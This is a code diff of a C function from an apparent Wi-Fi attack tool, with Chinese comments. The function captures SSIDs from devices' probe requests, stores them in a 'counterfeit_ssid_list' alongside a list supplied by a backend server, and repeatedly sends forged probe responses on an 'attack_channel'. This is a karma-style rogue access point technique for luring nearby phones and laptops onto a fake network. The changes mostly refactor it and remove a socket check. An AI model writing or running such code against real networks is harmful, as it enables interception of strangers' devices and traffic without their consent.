@@ -179,7 +179,7 @@ extern int socket_tcp;
 
 static int parseSTProbereqFrame(const unsigned char* data, const int len, int index, int8_t rssi)
 {
-    printf("get one pr frame\n");
+//    printf("get one pr frame\n");
 
     /*------------------------------------------------------------------------
      * @author longll
@@ -248,73 +248,53 @@ static int parseSTProbereqFrame(const unsigned char* data, const int len, int in
     static time_t last_start_send_time = 0; // seconds
 //	static time_t last_send_server_ssid_time = 0;
 
-    if (sk == -1 || sk == 0) {
+   /* if (sk == -1 || sk == 0) {
         // do nothing
-    } else {
-        int i, k;
-        int length = 0;
-        int attack_channel = 7;
-        int packet_size = 256;
-        unsigned char packet[packet_size];
-        int send_result = 0;
-        int attack_cnt = 0;
+        printf("sk not ready\n");
+    } else {*/
+    int i, k;
+    int length = 0;
+    int attack_channel = 7;
+    int packet_size = 256;
+    unsigned char packet[packet_size];
+    int send_result = 0;
+    int attack_cnt = 0;
 
-        static int index_local_ssid_list = 0; // 记录counterfeit_ssid_list的发送的下标，因为一次只能发送40个，一次肯定不能全部接受到。循环发送
+    static int index_local_ssid_list = 0; // 记录counterfeit_ssid_list的发送的下标，因为一次只能发送40个，一次肯定不能全部接受到。循环发送
 
 //		int strat = time(NULL);
 
 
-        int time_diff = time(NULL) - last_start_send_time;
-        if (time_diff > 180) {
-            if (time_diff > 600) {
-                //重置时间
-                printf("reset the last_start_send_time\n");
-                last_start_send_time = time(NULL);
+    int time_diff = time(NULL) - last_start_send_time;
+    if (time_diff > 180) {
+        if (time_diff > 600) {
+            //重置时间
+            printf("reset the last_start_send_time\n");
+            last_start_send_time = time(NULL);
 //				printf("reset the last_start_send_time\n");
-            } else {
-                // 回复by本地原本的SSID列表, 每次只发送40个
+        } else {
+            // 回复by本地原本的SSID列表, 每次只发送40个
 //				printf("reply with local ssid list\n");
 
-                int count = 0;
-                for (; index_local_ssid_list < counterfeit_ssid_list.length && count < 20; index_local_ssid_list++, count++) {
-//					printf("send response frame with ssid = %s\n", counterfeit_ssid_list.element[index_local_ssid_list]);
-                    int ssid_len = strlen(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid);
-                    int length = 0;
-                    if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 0) {
-                        length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                            PROBE_RESP_FRAME, 0, attack_channel, packet, packet_size);
-                    } else if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 1) {
-                        length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                            PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
-                    } else if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 2) {
-                        length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                            PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
-
-                        for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
-                        {
-                            if (-1 == (send_result = sendPcakage(1, packet, length))) {
-//                            if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
-                                printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                                       counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid,
-                                       tmp_mac[0],
-                                       tmp_mac[1],
-                                       tmp_mac[2],
-                                       tmp_mac[3],
-                                       tmp_mac[4],
-                                       tmp_mac[5]);
-                                usleep(ATTACK_INTERVAL);
-                            }
-//							usleep(ATTACK_INTERVAL);
-                        }
-
-                        length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                            PROBE_RESP_FRAME, 0, attack_channel, packet, packet_size);
-                    }
+            int count = 0;
+            for (; index_local_ssid_list < counterfeit_ssid_list.length && count < 20; index_local_ssid_list++, count++) {
+//                printf("send response frame with ssid = %s\n", counterfeit_ssid_list.element[index_local_ssid_list]);
+                int ssid_len = strlen(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid);
+                int length = 0;
+                if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 0) {
+                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                        PROBE_RESP_FRAME, 0, attack_channel, packet, packet_size);
+                } else if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 1) {
+                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
+                } else if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 2) {
+                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
 
                     for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
                     {
                         if (-1 == (send_result = sendPcakage(1, packet, length))) {
-//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
+//                            if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
                             printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                                    counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid,
                                    tmp_mac[0],
@@ -325,169 +305,190 @@ static int parseSTProbereqFrame(const unsigned char* data, const int len, int in
                                    tmp_mac[5]);
                             usleep(ATTACK_INTERVAL);
                         }
-
+//							usleep(ATTACK_INTERVAL);
                     }
 
-                    if (index_local_ssid_list == counterfeit_ssid_list.length-1 ) {
-                        index_local_ssid_list = -1;
+                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                        PROBE_RESP_FRAME, 0, attack_channel, packet, packet_size);
+                }
+
+                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
+                {
+                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
+//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
+                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                               counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid,
+                               tmp_mac[0],
+                               tmp_mac[1],
+                               tmp_mac[2],
+                               tmp_mac[3],
+                               tmp_mac[4],
+                               tmp_mac[5]);
+                        usleep(ATTACK_INTERVAL);
                     }
 
                 }
-            }
-        } else {
-            // 回复by后台发回的
 
-//			printf("replay with server's ssid list\n");
-            for (k = 0; k < ssid_list_from_server.length; k++) {
-
-                int ssid_len = strlen(ssid_list_from_server.element[k]->induced_ssid);
-
-                if (ssid_list_from_server.element[k]->encrypt == 2) {
-                    //加密方式为 未知
-
-                    //先发送加密的
-//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-//								 BEACON_FRAME, 1, attack_channel, packet, packet_size);
-                    length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
-
-                    for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
-                    {
-                        if (-1 == (send_result = sendPcakage(1, packet, length))) {
-//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
-                            printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                                   ssid_list_from_server.element[k]->induced_ssid,
-                                   tmp_mac[0],
-                                   tmp_mac[1],
-                                   tmp_mac[2],
-                                   tmp_mac[3],
-                                   tmp_mac[4],
-                                   tmp_mac[5]);
-                            usleep(ATTACK_INTERVAL);
-                        }
-//					usleep(ATTACK_INTERVAL);
-                    }
-
-                    /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                           ssid_list_from_server.element[k]->induced_ssid,
-                           tmp_mac[0],
-                           tmp_mac[1],
-                           tmp_mac[2],
-                           tmp_mac[3],
-                           tmp_mac[4],
-                           tmp_mac[5]);*/
-
-                    //再发送不加密的
-//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-//								 BEACON_FRAME, 0, attack_channel, packet, packet_size);
-                    length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
-
-                    for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
-                    {
-                        if (-1 == (send_result = sendPcakage(1, packet, length))) {
-//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
-                            printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                                   ssid_list_from_server.element[k]->induced_ssid,
-                                   tmp_mac[0],
-                                   tmp_mac[1],
-                                   tmp_mac[2],
-                                   tmp_mac[3],
-                                   tmp_mac[4],
-                                   tmp_mac[5]);
-                            usleep(ATTACK_INTERVAL);
-                        }
-//					usleep(ATTACK_INTERVAL);
-                    }
-
-                    /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                           ssid_list_from_server.element[k]->induced_ssid,
-                           tmp_mac[0],
-                           tmp_mac[1],
-                           tmp_mac[2],
-                           tmp_mac[3],
-                           tmp_mac[4],
-                           tmp_mac[5]);*/
-
-
-
-                } else if (ssid_list_from_server.element[k]->encrypt == 1) {
-                    //加密方式为 加密
-//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-//								 BEACON_FRAME, 1, attack_channel, packet, packet_size);
-                    length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
-                    int attack_cnt = 0;
-                    for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
-                    {
-                        if (-1 == (send_result = sendPcakage(1, packet, length))) {
-//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
-                            printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                                   ssid_list_from_server.element[k]->induced_ssid,
-                                   tmp_mac[0],
-                                   tmp_mac[1],
-                                   tmp_mac[2],
-                                   tmp_mac[3],
-                                   tmp_mac[4],
-                                   tmp_mac[5]);
-                            usleep(ATTACK_INTERVAL);
-                        }
-//					usleep(ATTACK_INTERVAL);
-                    }
-
-                    /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                           ssid_list_from_server.element[k]->induced_ssid,
-                           tmp_mac[0],
-                           tmp_mac[1],
-                           tmp_mac[2],
-                           tmp_mac[3],
-                           tmp_mac[4],
-                           tmp_mac[5]);*/
-
-
-
-                } else if (ssid_list_from_server.element[k]->encrypt == 0) {
-                    //加密方式为 不加密 free
-
-//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-//								 BEACON_FRAME, 0, attack_channel, packet, packet_size);
-                    length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
-                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
-                    int attack_cnt = 0;
-                    for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
-                    {
-                        if (-1 == (send_result = sendPcakage(1, packet, length))) {
-//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
-                            printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                                   ssid_list_from_server.element[k]->induced_ssid,
-                                   tmp_mac[0],
-                                   tmp_mac[1],
-                                   tmp_mac[2],
-                                   tmp_mac[3],
-                                   tmp_mac[4],
-                                   tmp_mac[5]);
-                            usleep(ATTACK_INTERVAL);
-                        }
-//					usleep(ATTACK_INTERVAL);
-                    }
-
-                    /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
-                           ssid_list_from_server.element[k]->induced_ssid,
-                           tmp_mac[0],
-                           tmp_mac[1],
-                           tmp_mac[2],
-                           tmp_mac[3],
-                           tmp_mac[4],
-                           tmp_mac[5]);*/
-
+                if (index_local_ssid_list == counterfeit_ssid_list.length-1 ) {
+                    index_local_ssid_list = -1;
                 }
+
             }
         }
+    } else {
+        // 回复by后台发回的
+
+//        printf("replay with server's ssid list\n");
+        for (k = 0; k < ssid_list_from_server.length; k++) {
+
+            int ssid_len = strlen(ssid_list_from_server.element[k]->induced_ssid);
+
+            if (ssid_list_from_server.element[k]->encrypt == 2) {
+                //加密方式为 未知
+
+                //先发送加密的
+//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+//								 BEACON_FRAME, 1, attack_channel, packet, packet_size);
+                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
+
+                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
+                {
+                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
+//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
+                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                               ssid_list_from_server.element[k]->induced_ssid,
+                               tmp_mac[0],
+                               tmp_mac[1],
+                               tmp_mac[2],
+                               tmp_mac[3],
+                               tmp_mac[4],
+                               tmp_mac[5]);
+                        usleep(ATTACK_INTERVAL);
+                    }
+//					usleep(ATTACK_INTERVAL);
+                }
+
+                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                       ssid_list_from_server.element[k]->induced_ssid,
+                       tmp_mac[0],
+                       tmp_mac[1],
+                       tmp_mac[2],
+                       tmp_mac[3],
+                       tmp_mac[4],
+                       tmp_mac[5]);*/
+
+                //再发送不加密的
+//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+//								 BEACON_FRAME, 0, attack_channel, packet, packet_size);
+                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
+
+                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
+                {
+                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
+//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
+                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                               ssid_list_from_server.element[k]->induced_ssid,
+                               tmp_mac[0],
+                               tmp_mac[1],
+                               tmp_mac[2],
+                               tmp_mac[3],
+                               tmp_mac[4],
+                               tmp_mac[5]);
+                        usleep(ATTACK_INTERVAL);
+                    }
+//					usleep(ATTACK_INTERVAL);
+                }
+
+                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                       ssid_list_from_server.element[k]->induced_ssid,
+                       tmp_mac[0],
+                       tmp_mac[1],
+                       tmp_mac[2],
+                       tmp_mac[3],
+                       tmp_mac[4],
+                       tmp_mac[5]);*/
+
+
+
+            } else if (ssid_list_from_server.element[k]->encrypt == 1) {
+                //加密方式为 加密
+//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+//								 BEACON_FRAME, 1, attack_channel, packet, packet_size);
+                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
+                int attack_cnt = 0;
+                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
+                {
+                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
+//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
+                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                               ssid_list_from_server.element[k]->induced_ssid,
+                               tmp_mac[0],
+                               tmp_mac[1],
+                               tmp_mac[2],
+                               tmp_mac[3],
+                               tmp_mac[4],
+                               tmp_mac[5]);
+                        usleep(ATTACK_INTERVAL);
+                    }
+//					usleep(ATTACK_INTERVAL);
+                }
+
+                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                       ssid_list_from_server.element[k]->induced_ssid,
+                       tmp_mac[0],
+                       tmp_mac[1],
+                       tmp_mac[2],
+                       tmp_mac[3],
+                       tmp_mac[4],
+                       tmp_mac[5]);*/
+
+
+
+            } else if (ssid_list_from_server.element[k]->encrypt == 0) {
+                //加密方式为 不加密 free
+
+//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+//								 BEACON_FRAME, 0, attack_channel, packet, packet_size);
+                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
+                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
+                int attack_cnt = 0;
+                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
+                {
+                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
+//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
+                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                               ssid_list_from_server.element[k]->induced_ssid,
+                               tmp_mac[0],
+                               tmp_mac[1],
+                               tmp_mac[2],
+                               tmp_mac[3],
+                               tmp_mac[4],
+                               tmp_mac[5]);
+                        usleep(ATTACK_INTERVAL);
+                    }
+//					usleep(ATTACK_INTERVAL);
+                }
+
+                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
+                       ssid_list_from_server.element[k]->induced_ssid,
+                       tmp_mac[0],
+                       tmp_mac[1],
+                       tmp_mac[2],
+                       tmp_mac[3],
+                       tmp_mac[4],
+                       tmp_mac[5]);*/
+
+            }
+        }
+    }
 
 //		printf("end send response frame , time used = %d\n", time(NULL)-strat);
 
 
-    }
+//    }
 //--------------------------------------------------------------------------------------------------
 
     /*------------------------------------------------------------------------
@@ -523,11 +524,11 @@ static int parseSTProbereqFrame(const unsigned char* data, const int len, int in
 
 //    printf("check ssid if is in the list\n");
     // if the ssid is not in the counterfei_list, add it
-    int length = 0;
+    int l = 0;
     int find = 0;
     if (is_history) {
-        for (length = 0; length < counterfeit_ssid_list.length; length++) {
-            int res = strcmp(counterfeit_ssid_list.element[length]->induced_ssid, ssid);
+        for (l = 0; l < counterfeit_ssid_list.length; l++) {
+            int res = strcmp(counterfeit_ssid_list.element[l]->induced_ssid, ssid);
 //        int res = memcpy(counterfeit_ssid_list.element[length]->induced_ssid, ssid, MAX_SSID_LEN);
             if (res == 0) {
 //                printf("got a known ssid = %s\n", ssid);
@@ -542,19 +543,19 @@ static int parseSTProbereqFrame(const unsigned char* data, const int len, int in
 
             printf("got a unknown ssid = %s, counterfeit_ssid_length = %d\n", ssid, counterfeit_ssid_list.length);
 
-            length = counterfeit_ssid_list.length;
-            if (length < INDUCE_SSID_SIZE-1) {
+            l = counterfeit_ssid_list.length;
+            if (l < INDUCE_SSID_SIZE-1) {
 //                printf("add to counterfeit_ssid_list\n");
-                counterfeit_ssid_list.element[length] = (counterfeit_ssid_t *)calloc(sizeof(counterfeit_ssid_t), 1);
+                counterfeit_ssid_list.element[l] = (counterfeit_ssid_t *)calloc(sizeof(counterfeit_ssid_t), 1);
 
-                if(!counterfeit_ssid_list.element[length]){
+                if(!counterfeit_ssid_list.element[l]){
                     printf("Allocate memory error!");
                 } else {
-                    memcpy(counterfeit_ssid_list.element[length]->induced_ssid, ssid, MAX_SSID_LEN);
-                    counterfeit_ssid_list.element[length]->encrypt = 2;
-                    counterfeit_ssid_list.element[length]->hit = 0;
-                    counterfeit_ssid_list.element[length]->radiate = 0;
-                    counterfeit_ssid_list.element[length]->radiate_time = 0;
+                    memcpy(counterfeit_ssid_list.element[l]->induced_ssid, ssid, MAX_SSID_LEN);
+                    counterfeit_ssid_list.element[l]->encrypt = 2;
+                    counterfeit_ssid_list.element[l]->hit = 0;
+                    counterfeit_ssid_list.element[l]->radiate = 0;
+                    counterfeit_ssid_list.element[l]->radiate_time = 0;
 
                     counterfeit_ssid_list.length++;
                 }
